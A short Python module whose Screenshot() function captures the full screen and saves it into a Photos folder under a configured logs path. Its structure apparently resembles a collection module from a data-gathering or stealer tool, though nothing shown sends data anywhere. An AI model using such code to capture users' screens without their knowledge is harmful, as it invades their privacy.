from PIL import ImageGrab
from os import environ, makedirs
from manager.logger import Log
from preferences.config import config

def Screenshot():
    try:
        screen = ImageGrab.grab()
        makedirs(f'{config.pathToLogs}\\Photos', exist_ok=True)
        screen.save(f'{config.pathToLogs}\\Photos\\sreenshot.jpg')
    except Exception as e:
        Log(f"Screenshot ---> {e}")